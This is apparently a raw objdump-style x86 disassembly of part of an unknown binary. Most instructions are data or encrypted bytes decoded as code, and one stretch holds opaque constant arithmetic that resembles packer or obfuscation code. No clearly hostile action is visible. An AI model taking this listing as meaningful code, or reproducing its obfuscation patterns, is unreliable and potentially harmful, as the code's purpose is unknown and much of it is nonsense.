  40f8b7:	sbb    al,BYTE PTR fs:[edi+0x44]
  40f8bb:	out    dx,al
  40f8bc:	inc    ebx
  40f8bd:	add    al,0xf4
  40f8bf:	dec    ecx
  40f8c0:	cwde   
  40f8c1:	adc    esp,ebp
  40f8c3:	pop    esp
  40f8c4:	call   0x58389e99
  40f8c9:	mov    al,0x81
  40f8cb:	retf   0xe9e2
  40f8ce:	mov    ecx,ss
  40f8d0:	lods   eax,DWORD PTR ds:[esi]
  40f8d1:	dec    ebx
  40f8d2:	mov    ds:0x4c15346d,eax
  40f8d7:	inc    ecx
  40f8d8:	jg     0x40f939
  40f8da:	xor    DWORD PTR [edi-0x52],ebx
  40f8dd:	jae    0x40f8a7
  40f8df:	inc    edx
  40f8e0:	add    al,0xd4
  40f8e2:	jecxz  0x40f873
  40f8e4:	jg     0x40f879
  40f8e6:	aaa    
  40f8e7:	jp     0x40f91f
  40f8e9:	adc    dl,BYTE PTR [eax-0x2cd70c6b]
  40f8ef:	sti    
  40f8f0:	xchg   edx,eax
  40f8f2:	(bad)  
  40f8f3:	or     BYTE PTR [esi+edx*2+0x7fc08deb],ch
  40f8fa:	test   DWORD PTR [edx+0x23],eax
  40f8fd:	pop    edi
  40f8fe:	or     BYTE PTR [ecx],0x52
  40f901:	jmp    0xe45d5c65
  40f906:	cdq    
  40f907:	aas    
  40f908:	jmp    0x40f93d
  40f90a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f90b:	inc    edi
  40f90c:	xchg   ebx,eax
  40f90d:	cmc    
  40f90e:	add    esi,0x2c
  40f911:	push   cs
  40f912:	clc    
  40f913:	pop    esi
  40f914:	add    al,0x9c
  40f916:	out    dx,eax
  40f917:	mov    ds:0xf4d6a715,al
  40f91c:	push   0x7de44226
  40f921:	stc    
  40f922:	or     DWORD PTR [eax+0xd62463f],ebp
  40f928:	or     al,0xbb
  40f92a:	add    dl,BYTE PTR [edi-0x3cdfe4ab]
  40f930:	std    
  40f931:	sub    BYTE PTR [eax],dl
  40f933:	shl    BYTE PTR [ebp+eiz*4+0x75],1
  40f937:	je     0x40f94a
  40f939:	out    0xfc,eax
  40f93b:	inc    edx
  40f93c:	rcr    bl,0x5a
  40f93f:	test   al,0xc1
  40f941:	sbb    bh,dl
  40f943:	mov    ds:0xf5d7b230,al
  40f948:	add    DWORD PTR [esi],ecx
  40f94a:	in     eax,dx
  40f94b:	inc    ecx
  40f94c:	and    BYTE PTR [eax-0x45ea171],ah
  40f952:	ret    
  40f953:	mov    ch,0xd9
  40f955:	dec    esi
  40f956:	adc    BYTE PTR [ebp+0x7f],bl
  40f959:	pop    ds
  40f95a:	out    dx,eax
  40f95b:	sub    DWORD PTR [ecx+0x4c3e212],ebx
  40f961:	idiv   DWORD PTR [ebx+0x4d]
  40f964:	int3   
  40f965:	dec    eax
  40f966:	inc    esi
  40f967:	pushf  
  40f968:	in     eax,0x9a
  40f96a:	inc    esp
  40f96b:	jmp    0x92996671
  40f970:	mov    al,0xb
  40f972:	data16 sahf 
  40f974:	jp     0x40f9d0
  40f976:	(bad)  
  40f977:	bound  edx,QWORD PTR [ecx-0x1f10d64f]
  40f97d:	rol    BYTE PTR fs:[ebp+edi*2+0x39],1
  40f982:	jno    0x40f9c5
  40f984:	mov    dl,0x8a
  40f986:	int    0x70
  40f988:	sub    DWORD PTR [esi+0x2c70eeb],eax
  40f98e:	sbb    al,0xb8
  40f990:	mov    edi,es
  40f992:	(bad)  
  40f994:	es cli 
  40f996:	ret    
  40f997:	fs dec ecx
  40f999:	lea    edi,[eax+0x4db7a728]
  40f99f:	mov    esi,0xc598fbe1
  40f9a4:	imul   edx,DWORD PTR [ebp+0x41],0x6
  40f9a8:	lds    ecx,FWORD PTR gs:[ebp+edx*1-0x4a7d1d6c]
  40f9b0:	push   eax
  40f9b1:	mov    ch,0xf6
  40f9b3:	ret    
  40f9b4:	imul   eax
  40f9b6:	dec    edx
  40f9b7:	rcl    DWORD PTR [eax],1
  40f9b9:	stos   BYTE PTR es:[edi],al
  40f9ba:	ficomp DWORD PTR [esi+ebx*4]
  40f9bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f9be:	cld    
  40f9bf:	pop    ds
  40f9c0:	inc    ebx
  40f9c1:	stos   DWORD PTR es:[edi],eax
  40f9c2:	fstp   TBYTE PTR [eax+0x7aa335a3]
  40f9c8:	or     al,0x0
  40f9ca:	repz mov dh,0xe1
  40f9cd:	mov    ah,0xe8
  40f9cf:	pop    ds
  40f9d0:	sub    DWORD PTR [ecx-0x70],eax
  40f9d3:	or     eax,0x89c6e48a
  40f9d8:	retf   0xad60
  40f9db:	jg     0x40fa1c
  40f9dd:	retf   
  40f9de:	test   ah,0xf0
  40f9e1:	jmp    0x40fa0e
  40f9e3:	shl    DWORD PTR ds:0xc3e,0x89
  40f9ea:	inc    ebp
  40f9eb:	test   al,0xc7
  40f9ed:	inc    ebp
  40f9ee:	in     al,dx
  40f9ef:	mov    ebp,0x59000066
  40f9f4:	mov    DWORD PTR [ebp-0x4],ecx
  40f9f7:	mov    DWORD PTR [ebp-0x8],0x3374
  40f9fe:	mov    DWORD PTR [ebp-0xc],0x3c31
  40fa05:	mov    eax,DWORD PTR [ebp-0xc]
  40fa08:	mov    edx,DWORD PTR [ebp-0x8]
  40fa0b:	mov    esi,DWORD PTR [ebp-0x4]
  40fa0e:	xor    eax,edx
  40fa10:	xor    edx,edx
  40fa12:	div    esi
  40fa14:	mov    edx,DWORD PTR [ebp-0x14]
  40fa17:	and    eax,edx
  40fa19:	sub    eax,0x680
  40fa1e:	mov    DWORD PTR [ebp-0x24],eax
  40fa21:	mov    DWORD PTR [ebp-0x30],0x5f68
  40fa28:	mov    DWORD PTR [ebp-0x2c],0x398b
  40fa2f:	mov    DWORD PTR [ebp-0x4],0x5034
  40fa36:	mov    DWORD PTR [ebp-0x8],0x7cbf
  40fa3d:	mov    DWORD PTR [ebp-0xc],0x4f6c
  40fa44:	mov    DWORD PTR [ebp-0x14],0xee2
  40fa4b:	mov    eax,DWORD PTR [ebp-0x14]
  40fa4e:	add    eax,DWORD PTR [ebp-0xc]
  40fa51:	mov    edx,DWORD PTR [ebp-0x8]
  40fa54:	xor    eax,edx
  40fa56:	mov    edx,DWORD PTR [ebp-0x4]
  40fa59:	or     eax,edx
  40fa5b:	mov    edx,DWORD PTR [ebp-0x2c]
  40fa5e:	or     eax,edx
  40fa60:	mov    edx,DWORD PTR [ebp-0x30]
  40fa63:	and    eax,edx
  40fa65:	mov    edx,0x5b68
  40fa6a:	sub    edx,eax
  40fa6c:	mov    DWORD PTR [ebp-0x24],edx
  40fa6f:	mov    DWORD PTR [ebp-0x48],0x3308
  40fa76:	mov    DWORD PTR [ebp-0x44],0x59a4
  40fa7d:	mov    DWORD PTR [ebp-0x38],0x2775
  40fa84:	mov    DWORD PTR [ebp-0x34],0x4da
  40fa8b:	mov    DWORD PTR [ebp-0x40],0x49d8
  40fa92:	mov    DWORD PTR [ebp-0x3c],0x1b5c
  40fa99:	mov    DWORD PTR [ebp-0x28],0x338c
  40faa0:	mov    DWORD PTR [ebp-0x24],0x68ed
  40faa7:	mov    DWORD PTR [ebp-0x20],0x2a7b
  40faae:	mov    DWORD PTR [ebp-0x1c],0x718f
  40fab5:	mov    eax,DWORD PTR [ebp-0x20]
  40fab8:	mov    edx,DWORD PTR [ebp-0x1c]
  40fabb:	mov    esi,DWORD PTR [ebp-0x28]
  40fabe:	mov    ebx,DWORD PTR [ebp-0x24]
  40fac1:	add    eax,0xffffc948
  40fac6:	adc    edx,0xffff87b0
  40facc:	or     eax,esi
  40face:	mov    esi,DWORD PTR [ebp-0x40]
  40fad1:	or     eax,esi
  40fad3:	or     edx,ebx
  40fad5:	mov    ebx,DWORD PTR [ebp-0x3c]
  40fad8:	mov    esi,DWORD PTR [ebp-0x38]
  40fadb:	or     edx,ebx
  40fadd:	mov    ebx,DWORD PTR [ebp-0x34]
  40fae0:	sub    eax,esi
  40fae2:	mov    esi,DWORD PTR [ebp-0x48]
  40fae5:	sbb    edx,ebx
  40fae7:	mov    ebx,DWORD PTR [ebp-0x44]
  40faea:	or     eax,esi
  40faec:	or     edx,ebx
  40faee:	add    eax,0x89b
  40faf3:	mov    DWORD PTR [ebp-0x20],eax
  40faf6:	adc    edx,0x5a
  40faf9:	mov    DWORD PTR [ebp-0x1c],edx
  40fafc:	mov    DWORD PTR [ebp-0x80],0xfa4
  40fb03:	mov    DWORD PTR [ebp-0x70],0x618e
  40fb0a:	mov    DWORD PTR [ebp-0x6c],0x811
  40fb11:	mov    DWORD PTR [ebp-0x98],0x42d6904a
  40fb1b:	mov    DWORD PTR [ebp-0x94],0xe82c1
  40fb25:	mov    DWORD PTR [ebp-0x88],0x58ff
  40fb2f:	mov    DWORD PTR [ebp-0x84],0x7394
  40fb39:	xor    eax,eax
  40fb3b:	inc    eax
  40fb3c:	mov    DWORD PTR [ebp-0x64],eax
  40fb3f:	mov    DWORD PTR [ebp-0x8],0x5f59
  40fb46:	mov    DWORD PTR [ebp-0x4],0x652b
  40fb4d:	mov    DWORD PTR [ebp-0xc],0xf43
  40fb54:	mov    DWORD PTR [ebp-0x14],0x22dc
  40fb5b:	mov    DWORD PTR [ebp-0x2c],0x45d4
  40fb62:	mov    DWORD PTR [ebp-0x30],0x28e1
  40fb69:	mov    DWORD PTR [ebp-0x7c],0x5e09
  40fb70:	mov    DWORD PTR [ebp-0x50],0x3910
  40fb77:	mov    DWORD PTR [ebp-0x3c],0x5c97
  40fb7e:	mov    DWORD PTR [ebp-0x24],0x6111
  40fb85:	mov    DWORD PTR [ebp-0x78],ecx
  40fb88:	mov    DWORD PTR [ebp-0x34],ecx
  40fb8b:	mov    DWORD PTR [ebp-0x44],0x207a
  40fb92:	mov    DWORD PTR [ebp-0x60],eax
  40fb95:	mov    DWORD PTR [ebp-0x8c],0x7840
  40fb9f:	mov    DWORD PTR [ebp-0x4c],0x6b0b
  40fba6:	mov    eax,DWORD PTR [ebp-0x30]
  40fba9:	or     eax,0x70c5
  40fbae:	add    eax,DWORD PTR [ebp-0x2c]
  40fbb1:	mov    ecx,DWORD PTR [ebp-0x14]
  40fbb4:	or     eax,ecx
  40fbb6:	mov    ecx,0xce40
  40fbbb:	sub    ecx,eax
  40fbbd:	mov    eax,DWORD PTR [ebp-0xc]
  40fbc0:	sub    ecx,eax
  40fbc2:	imul   ecx,ecx,0x7480
  40fbc8:	add    ecx,DWORD PTR [ebp-0x58]
  40fbcb:	mov    eax,DWORD PTR [ebp-0x8]
  40fbce:	push   ecx
  40fbcf:	mov    ecx,DWORD PTR [ebp-0x4]
  40fbd2:	lea    eax,[ecx+eax*1-0x1e6d]
  40fbd9:	mov    ecx,DWORD PTR [ebp-0x64]
  40fbdc:	xor    edx,edx
  40fbde:	div    ecx
  40fbe0:	mov    ecx,DWORD PTR [ebp-0x74]
  40fbe3:	lea    eax,[eax+ecx*1-0xa617]
  40fbea:	push   eax
  40fbeb:	mov    eax,DWORD PTR [ebp-0x88]
  40fbf1:	mov    ecx,DWORD PTR [ebp-0x84]
  40fbf7:	push   0x770a
  40fbfc:	push   0x2a0c
  40fc01:	push   ecx
  40fc02:	push   eax
  40fc03:	call   0x416c20
  40fc08:	mov    ecx,DWORD PTR [ebp-0x98]
  40fc0e:	mov    esi,DWORD PTR [ebp-0x94]
  40fc14:	push   esi
  40fc15:	push   ecx
  40fc16:	or     edx,0x615d
  40fc1c:	or     eax,0x455c
  40fc21:	push   edx
  40fc22:	push   eax
  40fc23:	call   0x422072
  40fc28:	mov    ecx,DWORD PTR [ebp-0x70]
  40fc2b:	mov    edx,DWORD PTR [ebp-0x6c]
  40fc2e:	xor    eax,ecx
  40fc30:	mov    ecx,DWORD PTR [ebp-0x20]
  40fc33:	mov    edx,DWORD PTR [ebp-0x1c]
  40fc36:	mov    esi,DWORD PTR [ebp-0x80]
  40fc39:	and    eax,0xb49
  40fc3e:	add    esi,0x629b
  40fc44:	lea    eax,[eax+ecx*1-0xfd]
  40fc4b:	xor    esi,0x4994
  40fc51:	push   eax
  40fc52:	lea    esi,[ebp+esi*1-0x3c93]
  40fc59:	call   0x41066f
  40fc5e:	mov    ecx,eax
  40fc60:	mov    eax,DWORD PTR [ebp-0x50]
  40fc63:	mov    edx,DWORD PTR [ebp-0x7c]
  40fc66:	sub    eax,0x161
  40fc6b:	xor    eax,edx
  40fc6d:	imul   eax,eax,0x5151
  40fc73:	jmp    0x40ff41
  40fc78:	fiadd  WORD PTR [edi-0x46]
  40fc7b:	rcr    DWORD PTR [edx],1
  40fc7d:	dec    esp
  40fc7e:	fisub  DWORD PTR [esi]
  40fc80:	out    dx,eax
  40fc81:	mov    bl,BYTE PTR [ebp+0x1f5f7c70]
  40fc87:	jle    0x40fcff
  40fc89:	sahf   
  40fc8a:	sbb    BYTE PTR [eax],bl
  40fc8c:	mov    esi,0xef181814
  40fc91:	inc    esi
  40fc92:	xor    dh,bh
  40fc94:	in     eax,dx
  40fc95:	mov    ds:0x266982e5,al
  40fc9a:	data16 cs fcmovnb st,st(1)
  40fc9e:	jnp    0x40fced
  40fca0:	cmp    al,0x38
  40fca2:	and    edx,ebp
  40fca4:	out    0xfc,al
  40fca6:	sub    DWORD PTR [edx],0xb23c55a1
  40fcac:	fbstp  TBYTE PTR [ebx]
  40fcae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fcaf:	add    ebx,DWORD PTR [edx+ebp*8-0x2260ff48]
  40fcb6:	sbb    ecx,edi
  40fcb8:	in     ax,0x4d
  40fcbb:	or     esp,esp
  40fcbd:	aad    0x0
  40fcbf:	add    DWORD PTR [edi+edi*1+0x2b47cff4],edi
  40fcc6:	mov    edx,?
  40fcc8:	jne    0x40fd1c
  40fcca:	xor    BYTE PTR [esi],bh
  40fccc:	xchg   esi,eax
  40fccd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fcce:	jmp    0xd42f8b34
  40fcd3:	push   esi
  40fcd4:	not    al
  40fcd6:	enter  0x31ed,0x1c
  40fcda:	shl    BYTE PTR [esp+ebx*4],cl
  40fcdd:	xor    eax,0x56106b49
  40fce2:	bound  esi,QWORD PTR [edx-0x3d8b305]
  40fce8:	lahf   
  40fce9:	add    cl,cl
  40fceb:	push   esp
  40fcec:	add    eax,0xc622671f
  40fcf1:	in     eax,0x30
  40fcf3:	lods   eax,DWORD PTR ds:[esi]
  40fcf4:	popa   
  40fcf5:	push   ss
  40fcf6:	stos   DWORD PTR es:[edi],eax
  40fcf7:	xchg   edx,eax
  40fcf8:	out    dx,eax
  40fcf9:	ja     0x40fd04
  40fcfb:	sbb    DWORD PTR [edx-0xd24a829],eax
  40fd01:	adc    DWORD PTR [ebx-0x45],ebx
  40fd04:	and    BYTE PTR [edx-0x607e15f6],0x9
  40fd0b:	popf   
  40fd0c:	aas    
  40fd0d:	xor    al,0x29
  40fd0f:	pop    esp
  40fd10:	repnz pop ds
  40fd12:	ds push 0xfffffff1
  40fd15:	es mov cl,0x2e
  40fd18:	cmp    DWORD PTR [ebp-0x1d],ebx
  40fd1b:	pop    ebp
  40fd1c:	div    ah
  40fd1e:	inc    esp
  40fd1f:	fs loopne 0x40fd70
  40fd22:	mov    esi,0x4fb39c9a
  40fd27:	sub    dl,BYTE PTR [ecx+eiz*4]
  40fd2a:	pop    edi
  40fd2b:	sbb    DWORD PTR [ecx+0x1e],ebx
  40fd2e:	(bad)  
  40fd30:	add    eax,0x299a8277
  40fd35:	sbb    eax,DWORD PTR [esi+0x6]
  40fd38:	adc    eax,0x86000f61
  40fd3d:	adc    esi,ebp
  40fd3f:	ret    0x48cc
  40fd42:	scas   al,BYTE PTR es:[edi]
  40fd43:	lds    eax,FWORD PTR [ecx+0x6a]
  40fd46:	sbb    esi,DWORD PTR [ebp+edx*1-0x1e5d7026]
  40fd4d:	aad    0xe4
  40fd4f:	(bad)  
  40fd50:	push   ebx
  40fd51:	xor    ebx,DWORD PTR [edi+0x1]
  40fd54:	xchg   ebx,eax
  40fd55:	sahf   
  40fd56:	xchg   ecx,eax
  40fd57:	ror    BYTE PTR [edx],cl
  40fd59:	dec    edx
  40fd5a:	jb     0x40fd32
  40fd5c:	gs std 
  40fd5e:	fisttp QWORD PTR [edi]
  40fd60:	popf   
  40fd61:	mov    ebx,0x11ca1931
  40fd66:	ss (bad) 
  40fd68:	jae    0x40fdbe
  40fd6a:	inc    ebp
  40fd6b:	ds ret 
  40fd6d:	jb     0x40fdd0
  40fd6f:	pusha  
  40fd70:	cmp    al,BYTE PTR [ecx+ebx*8-0x2b]
  40fd74:	das    
  40fd75:	mov    ecx,0xe88ba5b2
  40fd7a:	or     edi,esi
  40fd7c:	addr16 xchg edx,eax
  40fd7e:	loope  0x40fd7c
  40fd80:	or     edx,ecx
  40fd82:	or     edx,ebx
  40fd84:	lock dec ecx
  40fd86:	popf   
  40fd87:	addr16 xchg esp,eax
  40fd89:	out    dx,eax
  40fd8a:	sub    eax,0xff133630
  40fd8f:	popf   
  40fd90:	call   0xed74f957
  40fd95:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd97:	sub    al,0x43
  40fd99:	or     al,BYTE PTR [ebx]
  40fd9b:	fld    TBYTE PTR [esi-0x7]
  40fd9e:	mov    eax,ds:0x83760ac
  40fda3:	daa    
  40fda4:	out    dx,al
  40fda5:	rcl    ebx,cl
  40fda7:	int3   
  40fda8:	pop    ebx
  40fda9:	jl     0x40fe29
  40fdab:	adc    cl,ch
  40fdad:	loope  0x40fe2b
  40fdaf:	cmp    DWORD PTR [edi],ecx
  40fdb1:	adc    edx,ebx
  40fdb3:	ins    BYTE PTR es:[edi],dx
  40fdb4:	int3   
  40fdb5:	cmp    eax,0x730960cb
  40fdba:	ins    BYTE PTR es:[edi],dx
  40fdbb:	or     edi,DWORD PTR [ebx+0x19]
  40fdbe:	dec    edi
  40fdbf:	je     0x40fd66
  40fdc1:	or     edi,DWORD PTR [ebp+0x32e4f950]
  40fdc7:	mov    ds:0x74cea12b,eax
  40fdcc:	or     edi,esp
  40fdce:	addr16 jne 0x40fe11
  40fdd1:	mov    ecx,0x14c5d66c
  40fdd6:	jno    0x40fe56
  40fdd8:	xor    ah,0x43
  40fddb:	mov    BYTE PTR ds:[ebp+0x5f293dd4],bl
  40fde2:	daa    
  40fde3:	out    dx,al
  40fde4:	or     al,0x47
  40fde6:	cli    
  40fde7:	stos   BYTE PTR es:[edi],al
  40fde8:	xor    ebx,DWORD PTR [eax]
  40fdea:	pop    ss
  40fdeb:	push   edx
  40fdec:	xor    edi,ebx
  40fdee:	jns    0x40fd9e
  40fdf0:	jp     0x40fe12
  40fdf2:	scas   al,BYTE PTR es:[edi]
  40fdf3:	(bad)
  40fdf6:	xchg   bh,ch
  40fdf8:	push   ss
  40fdf9:	call   0x266b8649
  40fdfe:	xchg   cl,ah
  40fe00:	mov    BYTE PTR [edx-0x28],bl
  40fe03:	mul    dh
  40fe05:	enter  0xcffe,0x53
  40fe09:	repz test WORD PTR [esi],cx
  40fe0d:	jp     0x40fe4c
  40fe0f:	jno    0x40fe1f
  40fe11:	enter  0xf247,0x57
  40fe15:	scas   al,BYTE PTR es:[edi]
  40fe16:	xchg   DWORD PTR [esi],ebp
  40fe18:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  40fe1a:	ins    DWORD PTR es:[edi],dx
  40fe1b:	sub    BYTE PTR [ecx+0xc],bl
  40fe1e:	(bad)  
  40fe1f:	shl    DWORD PTR [ecx-0xa91e191],1
  40fe25:	data16 aas 
  40fe27:	inc    ecx
  40fe28:	and    edi,DWORD PTR [edx]
  40fe2a:	nop
  40fe2b:	clc    
  40fe2c:	inc    BYTE PTR ds:0x5dcca298
  40fe32:	adc    al,0xd2
  40fe34:	repz and edi,ebx
  40fe37:	pop    ds
  40fe38:	mov    dl,0x6a
  40fe3a:	push   edi
  40fe3b:	(bad)  
  40fe3c:	xchg   edi,eax
  40fe3d:	mov    ds:0xe2279ecd,al
  40fe42:	lahf   
  40fe43:	push   0xe4dcb172
  40fe48:	lods   eax,DWORD PTR ds:[esi]
  40fe49:	nop
  40fe4a:	jmp    0x7bfe3d9
  40fe4f:	mov    bh,0x3a
  40fe51:	js     0x40fde9
  40fe53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe55:	ffree  st(3)
  40fe57:	enter  0xfd71,0xb3
  40fe5b:	int    0xf0
  40fe5d:	inc    esi
  40fe5e:	or     al,0xa6
  40fe60:	sbb    eax,0x2533e71e
  40fe65:	aaa    
  40fe66:	mov    esi,0x45d3d1
  40fe6b:	mov    eax,ds:0xf41cc760
  40fe70:	call   0x184656da
  40fe75:	mov    bh,0xb2
  40fe77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe78:	push   0x62
  40fe7a:	fwait
  40fe7b:	outs   dx,BYTE PTR ds:[esi]
  40fe7c:	dec    esp
  40fe7d:	popa   
  40fe7e:	(bad)  
  40fe80:	xor    eax,0x1c25fef
  40fe85:	push   0x7336616f
  40fe8a:	jnp    0x40fed0
  40fe8c:	mov    edx,esp
  40fe8e:	repnz in eax,0xe7
  40fe91:	lods   eax,DWORD PTR ds:[esi]
  40fe92:	loope  0x40ff09
  40fe94:	or     esi,ebp
  40fe96:	imul   ecx,DWORD PTR [eax],0xffffffe7
  40fe99:	pop    esp
  40fe9a:	jns    0x40fe7d
  40fe9c:	jb     0x40ff01
  40fe9e:	inc    ecx
  40fe9f:	sub    DWORD PTR [edx],ebp
  40fea1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fea2:	out    0xd3,eax
  40fea4:	mov    dl,0xca
  40fea6:	adc    al,0x25
  40fea8:	pop    ebp
  40fea9:	push   ebx
  40feaa:	cmc    
  40feab:	sbb    DWORD PTR [esi],esp
  40fead:	icebp  
  40feae:	in     eax,dx
  40feaf:	jo     0x40fe3d
  40feb1:	push   eax
  40feb2:	ret    
  40feb3:	cmp    BYTE PTR [eax],ch
  40feb5:	jle    0x40fe4d
  40feb7:	repz add bl,BYTE PTR [eax]
  40feba:	mov    ds:0xcda149ea,eax
  40febf:	or     ch,ch
  40fec1:	xchg   BYTE PTR [eax-0x5e],dl
  40fec4:	or     al,0xaf
  40fec6:	mov    edx,0xa17b66af
  40fecb:	xor    eax,0x9e8f00e7
  40fed0:	leave  
  40fed1:	mov    ah,BYTE PTR [ebx]
  40fed3:	lods   al,BYTE PTR ds:[esi]
  40fed4:	and    al,0x24
  40fed6:	and    esi,DWORD PTR [edi-0x67cf16c3]
  40fedc:	dec    esi
  40fedd:	mov    edx,0xc7a0dab
  40fee2:	push   ebx
  40fee3:	jp     0x40ff0e
  40fee5:	push   esp
  40fee6:	adc    eax,0xa2bd46c
  40feeb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40feec:	repnz std 
  40feee:	sub    ebx,edi
  40fef0:	xchg   BYTE PTR [esi],dl
  40fef2:	inc    ebx
  40fef3:	into   
  40fef4:	or     ebp,DWORD PTR [esi-0x7d]
  40fef7:	cdq    
  40fef8:	test   esp,edi
  40fefa:	and    al,0x81
  40fefc:	mov    ebx,0xa2831636
  40ff01:	lods   eax,DWORD PTR ds:[esi]
  40ff02:	les    ecx,FWORD PTR [eax+0x10]
  40ff05:	mov    cl,0x49
  40ff07:	add    BYTE PTR [esi],bh
  40ff09:	lds    eax,FWORD PTR [ebp+0x14745bc4]
  40ff0f:	ss inc edi
  40ff11:	scas   al,BYTE PTR es:[edi]
  40ff12:	jle    0x40fed7
  40ff14:	lods   al,BYTE PTR ds:[esi]
  40ff15:	mov    dl,0x7b
  40ff17:	cmp    DWORD PTR ds:0xe10b4592,edi
  40ff1d:	push   es
  40ff1e:	mov    eax,0x412077f6
  40ff23:	stos   DWORD PTR es:[edi],eax
  40ff24:	push   cs
  40ff25:	push   ebp
  40ff26:	ss js  0x40ff7e
  40ff29:	push   es
  40ff2a:	or     BYTE PTR [ecx-0x60],dl
  40ff2d:	out    0xcd,eax
  40ff2f:	popa   
  40ff30:	cmp    BYTE PTR [eax+0x5],ah
  40ff33:	or     bl,BYTE PTR [esi-0x3d9cdade]
  40ff39:	std    
  40ff3a:	push   ecx
  40ff3b:	pusha  
  40ff3c:	sub    eax,DWORD PTR [ebx]
  40ff3e:	mov    al,ds:0x10500d5
  40ff43:	cmp    DWORD PTR [eax],eax
  40ff45:	add    BYTE PTR ds:0x40c2,dh
  40ff4b:	xor    edx,edx
  40ff4d:	mov    esi,0x218f6c45
  40ff52:	div    esi
  40ff54:	cmp    ecx,eax
  40ff56:	jmp    0x410224
  40ff5b:	ss int 0x1f
  40ff5e:	jnp    0x40ff7a
  40ff60:	pop    ebx
  40ff61:	xor    bl,BYTE PTR [ebp+ebx*1+0x147c73b9]
  40ff68:	sbb    BYTE PTR [edi+0x6a],al
  40ff6b:	sbb    eax,0xbe181898
  40ff70:	adc    al,0x18
  40ff72:	sbb    dh,cl
  40ff74:	(bad)  
  40ff76:	es test al,0x2c
  40ff79:	repz sti 
  40ff7b:	pop    ds
  40ff7c:	pmuludq mm7,mm3
  40ff7f:	retfw  
  40ff81:	mov    ebx,0xc86874c5
  40ff86:	sub    DWORD PTR [edx-0x3e],esp
  40ff89:	xor    ebx,ecx
  40ff8b:	popa   
  40ff8c:	jg     0x40ff82
  40ff8e:	mov    edx,0x8e78ce99
  40ff93:	add    BYTE PTR [eax-0x3e],ch
  40ff96:	std    
  40ff97:	push   ebx
  40ff98:	mov    ds:0xd854361e,eax
  40ff9d:	add    ch,BYTE PTR [ebp-0x60828d5f]
  40ffa3:	xchg   esp,eax
  40ffa4:	shl    BYTE PTR [eax],1
  40ffa6:	fcomp  st(1)
  40ffa8:	mov    dl,0xbc
  40ffaa:	or     dh,BYTE PTR [edi+0x6a]
  40ffad:	outs   dx,BYTE PTR ds:[esi]
  40ffae:	test   al,ah
  40ffb0:	(bad)  
  40ffb1:	jmp    0x8fab0650
  40ffb6:	and    eax,0x19f0a817
  40ffbb:	lds    esi,FWORD PTR [esi]
  40ffbd:	retf   
  40ffbe:	jmp    0x1906:0x8292b6b
  40ffc5:	fadd   DWORD PTR [ebx-0x41]
  40ffc8:	pop    eax
  40ffc9:	sbb    ecx,0xd513ba91
  40ffcf:	push   es
  40ffd0:	daa    
  40ffd1:	je     0x41004b
  40ffd3:	dec    esi
  40ffd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ffd5:	or     dh,BYTE PTR [ebx-0x3099d6ed]
  40ffdb:	cmp    al,0xd6
  40ffdd:	rcl    DWORD PTR [esp+ebx*1],cl
  40ffe0:	fidivr DWORD PTR [edi+0x25]
  40ffe3:	or     edx,DWORD PTR [edx+0x76e61723]
  40ffe9:	ss je  0x40ffba
  40ffec:	stos   DWORD PTR es:[edi],eax
  40ffed:	fisttp QWORD PTR [ebp+0x6bca21b]
  40fff3:	jmp    0x8642:0x395f7b74
  40fffa:	repnz dec eax
  40fffc:	das    
  40fffd:	xor    al,0x2b
  40ffff:	xchg   esp,eax
  410000:	and    BYTE PTR [eax-0x24],bl
  410003:	push   eax
  410004:	or     DWORD PTR ds:0x9f3268bc,edx
  41000a:	dec    edi
  41000b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41000c:	jbe    0x410076
  41000e:	cmc    
  41000f:	bound  esi,QWORD PTR [edi-0x13]
  410012:	test   al,0x63
  410014:	ja     0x410077
  410016:	xor    eax,ebx
  410018:	and    DWORD PTR [ecx+0x33a7b2f5],edx
  41001e:	or     BYTE PTR [ebx-0x35],dl
  410021:	pop    ss
  410022:	xchg   ebp,eax
  410023:	and    esp,DWORD PTR [edi+0xf]
  410026:	sti    
  410027:	mov    ?,WORD PTR [edx+0x39]
  41002a:	push   cs
  41002b:	adc    al,0x5b
  41002d:	jmp    0xee105123
  410032:	jge    0x41007b
  410034:	dec    ebx
  410035:	jl     0x4100b6
  410037:	sbb    al,0x16
  410039:	fistp  QWORD PTR [ebp+0x49e1a122]
  41003f:	fcomi  st,st(2)
  410041:	adc    al,0x4
  410043:	jo     0x410043
  410045:	fs daa 
  410047:	stos   BYTE PTR es:[edi],al
  410048:	(bad)  
  410049:	retf   0x7703
  41004c:	popa   
  41004d:	xchg   BYTE PTR es:[ecx],dl
  410050:	sub    DWORD PTR ds:0x88df1c3,edi
  410056:	sahf   
  410057:	adc    bl,cl
  410059:	bound  esp,QWORD PTR [edi-0x44]
  41005c:	adc    DWORD PTR [edi-0x5eee8298],eax
  410062:	sahf   
  410063:	mov    ch,BYTE PTR [ecx]
  410065:	adc    eax,0xf2b8f538
  41006a:	jg     0x410086
  41006c:	icebp  
  41006d:	iret   
  41006e:	pop    ebx
  41006f:	sbb    DWORD PTR [esi-0x35ef2084],eax
  410075:	leave  
  410076:	jbe    0x410081
  410078:	mov    dh,0xc8
  41007a:	mov    BYTE PTR [ecx+0x4911df6f],0x73
  410081:	mov    ds:0x57fa6b0f,al
  410086:	sub    BYTE PTR [ebp+0x525e564f],dh
  41008c:	jmp    0x2a22:0x44361d1b
  410093:	adc    DWORD PTR [esi],esp
  410095:	(bad)  
  410096:	je     0x4100c7
  410098:	int3   
  410099:	pop    ecx
  41009a:	fcomp  QWORD PTR ds:0x9b03e41e
  4100a0:	adc    DWORD PTR [edx],edi
  4100a2:	jns    0x4100c7
  4100a4:	mov    edx,0x55fe6e19
  4100a9:	pop    es
  4100aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4100ab:	pop    ebx
  4100ac:	xchg   ebp,eax
  4100ad:	jecxz  0x410057
